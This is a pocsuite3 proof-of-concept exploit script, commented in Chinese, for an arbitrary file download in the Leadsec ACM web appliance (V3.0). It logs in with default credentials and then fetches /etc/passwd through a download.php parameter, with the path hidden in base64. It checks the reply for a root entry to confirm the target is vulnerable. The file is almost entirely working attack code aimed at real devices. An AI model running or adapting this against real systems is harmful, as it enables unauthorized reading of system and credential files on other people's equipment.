from collections import OrderedDict
import urllib.parse
import re
from pocsuite3.api import POCBase, Output, register_poc, logger, requests, OptDict, OptString, VUL_TYPE
from pocsuite3.api import REVERSE_PAYLOAD, POC_CATEGORY
from requests.api import patch
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from requests.sessions import session
# 禁用安全请求警告
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

sessions=requests.session()
class POC(POCBase):
    vulID = '0'  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = '1'  #默认为1
    author = ['luckying']  #  PoC作者的大名
    vulDate = '2021-10-19'  #漏洞公开的时间,不知道就写今天
    createDate = '2021-10-19'  # 编写 PoC 的日期
    updateDate = '2021-10-19'  # PoC 更新的时间,默认和编写时间一样
    references = ['']  # 漏洞地址来源,0day不用写
    name = 'Leadsec ACM后台任意文件下载'  # PoC 名称
    appPowerLink = ''  # 漏洞厂商主页地址
    appName = 'Leadsec ACM后台任意文件下载'  # 漏洞应用名称
    appVersion = '''V3.0'''  # 漏洞影响版本
    vulType = VUL_TYPE.WEAK_PASSWORD  #漏洞类型,类型参考见 漏洞类型规范表
    desc = '''
        网御上网行为管理系统 Leadsec ACM后台任意文件下载
    '''

  # 漏洞简要描述
    samples = ['']  # 测试样列,就是用 PoC 测试成功的网站
    install_requires = ['']  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    pocDesc = '''
    检测:pocsuite -r .\poc++.py -u url(-f url.txt) --verify 
    '''
    category = POC_CATEGORY.EXPLOITS.REMOTE
    
    def _verify(self):
        result = {}
        path = '/login.php'
        username=input('[+] 请输入用户名(默认为admin)：') or 'admin'
        pwd=input('[+] 请输入密码(默认为leadsec)：') or 'leadsec'
        data=f'language=chinese&username={username}&pwd={pwd}&mode=login&lang=&usbkey=login&find_username=&selquestion=0&txt_answer=&txt_newpwd=&txt_newpwdconfirm=&txtmac='
        headers={
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        url = self.url + path
        try:
            resq = sessions.post(url=url,data=data,headers=headers)
            path_read = '/log/download.php?local=yes&type=filedown&file=L2V0Yy9wYXNzd2Q=&filename=1.txt'
            url = self.url + path
            resq_read = sessions.get(url=self.url+path_read)
            if resq_read and resq_read.status_code == 200 and "root::0" in resq_read.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = url
                result['VerifyInfo']['POC'] = path
        except Exception as e:
            return
        return self.parse_output(result)

    def _attack(self):
        return self._verify()

    def parse_attack(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

    def _shell(self):
        return

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
   
register_poc(POC)